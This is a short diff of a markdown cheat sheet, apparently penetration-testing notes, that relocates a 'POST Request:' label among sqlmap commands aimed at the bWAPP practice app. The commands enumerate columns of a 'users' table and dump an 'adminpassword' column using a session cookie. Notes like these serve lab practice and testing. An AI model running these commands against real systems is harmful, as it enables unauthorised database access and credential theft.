@@ -257,8 +257,8 @@ Sqlmap :
   - sqlmap -u  "http://<ip>/sql.php?title = <your parmeter request>" --cookie ="<PHPSESSID=your cookie>" -p title -D bwapp -T users --colums
   - sqlmap -u  "http://<ip>/sql.php?title = <your parmeter request>" --cookie ="<PHPSESSID=your cookie>" -p title -D bwapp -T users -C adminpassword --dump
 ```
- POST Request:
 ```
+ POST Request:
   sqlmap -r request.txt -p title 
  
 ```
